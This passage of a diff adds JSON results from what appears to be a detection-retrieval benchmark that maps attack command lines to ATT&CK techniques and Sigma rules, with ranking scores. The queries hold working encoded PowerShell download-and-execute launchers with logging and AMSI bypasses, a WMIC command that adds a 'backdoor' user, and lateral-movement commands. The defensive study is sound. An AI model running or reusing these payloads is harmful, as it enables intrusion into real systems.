QA7AH0AOwBbAFMAWQBTAHQARQBtAC4ATgBlAFQALgBTAGUAcgB2AEkAQwBlAFAAbwBJAE4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABwAGUAQwBUADEAMAAwAEMAbwBuAHQASQBOAHUAZQA9ADAAOwAkADcAYQA2AGUARAA9AE4AZQBXAC0ATwBCAEoAZQBDAFQAIABTAFkAcwB0AGUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAEkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAFQALgBFAE4AQwBvAGQAaQBOAEcAXQA6ADoAVQBuAGkAYwBvAGQARQAuAEcAZQB0AFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgBUAF0AOgA6AEYAcgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADcAQQA2AEUAZAAuAEgARQBBAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADcAYQA2AEUAZAAuAFAAUgBPAHgAWQA9AFsAUwB5AFMAVABFAG0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUAZQBzAFQAXQA6ADoARABlAGYAQQBVAEwAdABXAGUAQgBQAFIAbwBYAFkAOwAkADcAYQA2AEUARAAuAFAAUgBPAFgAWQAuAEMAUgBlAGQARQBuAHQASQBBAGwAUwAgAD0AIABbAFMAWQBzAFQARQBNAC4ATgBFAHQALgBDAFIAZQBkAEUAbgBUAEkAYQBMAEMAYQBjAGgARQBdADoAOgBEAEUARgBhAFUAbAB0AE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AdABJAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADcAYQA2AGUAZAAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAdABlAE0ALgBUAGUAWABUAC4ARQBuAEMAbwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQBUAGUAUwAoACcAcQBtAC4AQAApADUAeQA/AFgAeAB1AFMAQQAtAD0AVgBEADQANgA3ACoAfABPAEwAVwBCAH4AcgBuADgAXgBJACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANwBBADYAZQBkAC4ASABlAEEARABlAHIAcwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBLAHUAVQB6AHUAaQBkAD0AVgBtAGUASwBWADUAZABlAGsAZwA5AHkANwBrAC8AdABsAEYARgBBADgAYgAyAEEAYQBJAHMAPQAiACkAOwAkAEQAYQB0AGEAPQAkADcAYQA2AGUAZAAuAEQAbwB3AE4ATABvAGEAZABEAGEAdABBACgAJABTAEUAcgArACQAdAApADsAJABpAHYAPQAkAEQAQQBUAEEAWwAwAC4ALgAzAF0AOwAkAEQAYQBUAEEAPQAkAGQAQQBUAEEAWwA0AC4ALgAkAEQAYQBUAEEALgBMAEUAbgBHAHQASABdADsALQBKAE8AaQBOAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1047"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 4,
+      "ndcg5": 0.27727342735504823,
+      "n_relevant": 35,
+      "top": [
+        "02030f2f-6199-49ec-b258-ea71b07e03dc",
+        "502b42de-4306-40b4-9596-6f590c81f073",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "438025f9-5856-4663-83f7-52f878a70a50",
+        "3c89a1e8-0fba-449e-8f1b-8409d6267ec8"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-158",
+      "query": "Image: C:\\Windows\\System32\\wbem\\WMIC.exe\nCommandLine: \"C:\\windows\\System32\\Wbem\\WMIC.exe\" /node:WORKSTATION6 process call create \"net user /add backdoor paw0rd1\"\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAUwBJAG8AbgBUAGEAYgBMAGUALgBQAFMAVgBFAHIAUwBJAE8ATgAuAE0AYQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJAAxADEAQgBEADgAPQBbAHIAZQBGAF0ALgBBAFMAcwBlAE0AYgBsAHkALgBHAGUAdABUAHkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAMQAxAEIAZAA4ACkAewAkAEEAMQA4AEUAMQA9ACQAMQAxAEIARAA4AC4ARwBlAHQAVgBhAEwAVQBFACgAJABuAFUAbABMACkAOwBJAGYAKAAkAEEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkAEEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABhADEAOABlADEAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AEEATAA9AFsAQwBvAEwAbABlAGMAdABpAE8ATgBTAC4ARwBlAE4ARQByAGkAQwAuAEQASQBjAFQAaQBPAG4AQQBSAFkAWwBTAHQAcgBJAE4ARwAsAFMAeQBzAFQARQBtAC4ATwBCAEoARQBjAHQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAQQBMAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAYQAxADgAZQAxAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMARQB7AFsAUwBjAFIAaQBwAFQAQgBsAE8AQwBLAF0ALgAiAEcAZQBUAEYASQBFAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbABVAGUAKAAkAE4AdQBMAEwALAAoAE4ARQB3AC0ATwBCAGoAZQBDAHQAIABDAG8ATABMAEUAYwBUAGkATwBOAFMALgBHAGUATgBlAHIASQBjAC4ASABBAHMASABTAGUAdABbAFMAVAByAGkAbgBnAF0AKQApAH0AJABSAGUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAEUATQBCAGwAeQAuAEcAZQBUAFQAeQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBFAHQARgBJAGUATABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATAB1AGUAKAAkAE4AVQBMAGwALAAkAHQAUgBVAGUAKQA7AH0AOwBbAFMAWQBTAHQARQBtAC4ATgBlAFQALgBTAGUAcgB2AEkAQwBlAFAAbwBJAE4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABwAGUAQwBUADEAMAAwAEMAbwBuAHQASQBOAHUAZQA9ADAAOwAkADcAYQA2AGUARAA9AE4AZQBXAC0ATwBCAEoAZQBDAFQAIABTAFkAcwB0AGUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAEkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAFQALgBFAE4AQwBvAGQAaQBOAEcAXQA6ADoAVQBuAGkAYwBvAGQARQAuAEcAZQB0AFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgBUAF0AOgA6AEYAcgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADcAQQA2AEUAZAAuAEgARQBBAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADcAYQA2AEUAZAAuAFAAUgBPAHgAWQA9AFsAUwB5AFMAVABFAG0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUAZQBzAFQAXQA6ADoARABlAGYAQQBVAEwAdABXAGUAQgBQAFIAbwBYAFkAOwAkADcAYQA2AEUARAAuAFAAUgBPAFgAWQAuAEMAUgBlAGQARQBuAHQASQBBAGwAUwAgAD0AIABbAFMAWQBzAFQARQBNAC4ATgBFAHQALgBDAFIAZQBkAEUAbgBUAEkAYQBMAEMAYQBjAGgARQBdADoAOgBEAEUARgBhAFUAbAB0AE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AdABJAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADcAYQA2AGUAZAAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAdABlAE0ALgBUAGUAWABUAC4ARQBuAEMAbwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQBUAGUAUwAoACcAcQBtAC4AQAApADUAeQA/AFgAeAB1AFMAQQAtAD0AVgBEADQANgA3ACoAfABPAEwAVwBCAH4AcgBuADgAXgBJACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANwBBADYAZQBkAC4ASABlAEEARABlAHIAcwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBLAHUAVQB6AHUAaQBkAD0AVgBtAGUASwBWADUAZABlAGsAZwA5AHkANwBrAC8AdABsAEYARgBBADgAYgAyAEEAYQBJAHMAPQAiACkAOwAkAEQAYQB0AGEAPQAkADcAYQA2AGUAZAAuAEQAbwB3AE4ATABvAGEAZABEAGEAdABBACgAJABTAEUAcgArACQAdAApADsAJABpAHYAPQAkAEQAQQBUAEEAWwAwAC4ALgAzAF0AOwAkAEQAYQBUAEEAPQAkAGQAQQBUAEEAWwA0AC4ALgAkAEQAYQBUAEEALgBMAEUAbgBHAHQASABdADsALQBKAE8AaQBOAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1047"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 6,
+      "ndcg5": 0.0,
+      "n_relevant": 35,
+      "top": [
+        "05a2ab7e-ce11-4b63-86db-ab32e763e11d",
+        "f4bbd493-b796-416e-bbf2-121235348529",
+        "178e615d-e666-498b-9630-9ed363038101",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "18988e1b-9087-4f8a-82fe-0414dce49878"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-158",
+      "query": "\"C:\\windows\\System32\\Wbem\\WMIC.exe\" /node:WORKSTATION6 process call create \"net user /add backdoor paw0rd1\"",
+      "kind": "technique",
+      "gold": [
+        "T1047"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 6,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1218.014",
+        "T1134.002",
+        "T1218.003",
+        "T1021.006",
+        "T1055.011"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-166",
+      "query": "C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe  172.18.39.6 C:\\Windows\\System32\\cmd.exe \"cmd.exe\" /c C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe 172.18.39.6",
+      "kind": "technique",
+      "gold": [
+        "T1021.003"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1070.010",
+        "T1218.014",
+        "T1570",
+        "T1218.003",
+        "T1080"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-166",
+      "query": "C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe  172.18.39.6 C:\\Windows\\System32\\cmd.exe \"cmd.exe\" /c C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe 172.18.39.6",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1021.003"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 1,
+      "ndcg5": 0.3391602052736161,
+      "n_relevant": 31,
+      "top": [
+        "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "502b42de-4306-40b4-9596-6f590c81f073",
+        "7cce6fc8-a07f-4d84-a53e-96e1879843c9",
+        "6b65c28e-11f3-46cb-902a-68f2cafaf474"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-166",
+      "query": "Image: C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe\nCommandLine: C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe  172.18.39.6\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: \"cmd.exe\" /c C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe 172.18.39.6",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1021.003"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 1,
+      "ndcg5": 0.5531464700081437,
+      "n_relevant": 31,
+      "top": [
+        "f1f3bf22-deb2-418d-8cce-e1a45e46a5bd",
+        "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
+        "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "438025f9-5856-4663-83f7-52f878a70a50"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-166",
+      "query": "C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe  172.18.39.6",
+      "kind": "technique",
+      "gold": [
+        "T1021.003"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1070.010",
+        "T1570",
+        "T1080",
+        "T1204.004",
+        "T1105"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-176",
+      "query": "C:\\Windows\\System32\\cmd.exe C:\\windows\\system32\\cmd.exe /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABlADIAPQBbAHIARQBGAF0ALgBBAFMAcwBlAE0AQgBsAHkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAEUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANAAzAEQARQAyACkAewAkADcAMQAyAEQAQgA9ACQANAAzAEQARQAyAC4ARwBlAHQAVgBhAEwAdQBFACgAJABOAHUAbABsACkAOwBJAGYAKAAkADcAMQAyAEQAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADcAMQAyAGQAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADEAMgBEAEIAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJABWAEEAbAA9AFsAQwBvAEwATABFAEMAVABJAE8AbgBzAC4ARwBlAG4AZQByAGkAYwAuAEQASQBDAHQASQBPAG4AYQByAHkAWwBzAHQAcgBpAG4ARwAsAFMAeQBzAHQAZQBNAC4ATwBCAEoARQBDAHQAXQBdADoAOgBOAGUAdwAoACkAOwAkAHYAQQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBsAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANwAxADIAZABCAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAYQBMAH0ARQBMAHMARQB7AFsAUwBDAFIAaQBQAFQAQgBMAG8AQwBrAF0ALgAiAEcARQBUAEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAE4AdQBsAGwALAAoAE4ARQB3AC0ATwBCAEoARQBDAFQAIABDAE8AbABsAEUAYwBUAGkATwBOAHMALgBHAGUAbgBFAFIASQBDAC4ASABBAHMAaABTAGUAdABbAFMAdABSAGkAbgBnAF0AKQApAH0AJABSAGUAZgA9AFsAUgBFAEYAXQAuAEEAcwBzAEUATQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATAB1AGUAKAAkAE4AVQBMAEwALAAkAHQAUgBVAGUAKQA7AH0AOwBbAFMAeQBTAFQAZQBtAC4ATgBFAHQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AdABNAEEATgBBAGcARQBSAF0AOgA6AEUAWABwAGUAYwB0ADEAMAAwAEMAbwBOAHQASQBuAHUARQA9ADAAOwAkADgAZgA1AEIAOQA9AE4ARQBXAC0ATwBiAGoAZQBjAHQAIABTAFkAUwBUAGUATQAuAE4AZQB0AC4AVwBFAEIAQwBsAEkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAHQALgBFAG4AYwBPAGQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQARQAuAEcARQBUAFMAVAByAGkAbgBnACgAWwBDAG8AbgBWAEUAcgB0AF0AOgA6AEYAcgBvAE0AQgBBAFMAZQA2ADQAUwB0AHIAaQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADgAZgA1AEIAOQAuAEgAZQBhAEQAZQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADgAZgA1AGIAOQAuAFAAcgBPAHgAWQA9AFsAUwB5AHMAVABlAE0ALgBOAEUAdAAuAFcAZQBiAFIAZQBRAFUARQBzAHQAXQA6ADoARABlAGYAYQBVAEwAdABXAGUAYgBQAFIATwB4AFkAOwAkADgARgA1AGIAOQAuAFAAcgBPAFgAeQAuAEMAcgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBTAHQAZQBtAC4ATgBlAHQALgBDAFIAZQBEAGUATgBUAEkAQQBsAEMAYQBDAEgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4ARQBUAHcATwByAGsAQwByAEUARABFAE4AVABpAGEAbABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADgAZgA1AGIAOQAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABFAG0ALgBUAGUAeABUAC4ARQBuAGMAbwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQBUAGUAcwAoACcAMABdAHIAWAAzAFkANAA6ACgAKQBKAGMAaABBAEsAawBSADcAVgBnACsAWwAvAFUAcAA5ADIAdABtAEcAUQB2ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUATgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAOABmADUAQgA5AC4ASABlAGEARABFAFIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AFAARgBqAE4AMQBIAHAAcgAyAE4ANwBiAGEAZgBlAGMAdwBXAC8ARwBiAG8AUwBNAHoAZwA0AD0AIgApADsAJABEAGEAdABBAD0AJAA4AGYANQBCADkALgBEAE8AVwBuAGwATwBhAGQARABBAFQAQQAoACQAcwBFAHIAKwAkAHQAKQA7ACQAaQBWAD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABEAEEAdABBAFsANAAuAC4AJABEAEEAdABhAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAEkATgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA= C:\\Windows\\System32\\services.exe C:\\windows\\system32\\services.exe",
+      "kind": "technique",
+      "gold": [
+        "T1569.002"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 7,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1059.001",
+        "T1543.003",
+        "T1547.001",
+        "T1546.007",
+        "T1059.003"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-176",
